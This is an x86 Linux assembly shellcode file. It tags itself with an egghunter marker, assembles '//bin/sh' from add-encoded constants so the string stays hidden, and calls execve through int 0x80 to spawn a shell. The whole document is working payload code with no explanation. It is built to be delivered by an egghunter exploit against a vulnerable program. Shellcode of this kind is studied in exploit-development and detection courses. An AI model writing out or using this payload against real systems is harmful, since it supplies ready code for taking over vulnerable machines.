global _start   
 
db "eGGheGGh"  ;declare egghunter keyword
 
section .text
_start:
     
    xor eax, eax
    push eax
 
    ; Pushing //bin/sh
 
    mov esi, 0x46510d0d     ;decode /bin/sh
    add esi, 0x22222222     ;push 0x68732f2f ;"sh//"
    mov dword [esp-4], esi

    mov esi, 0x4c47411d     ;decode /bin/sh
    add esi, 0x22222112     ;push 0x6e69622f ;"nib/"
    mov dword [esp-8], esi
    sub esp, 8              ;align esp 
    
    mov ebx, esp
 
    push eax
    mov edx, esp
 
    push ebx
    mov ecx, esp
 
    mov al, 11
    int 0x80
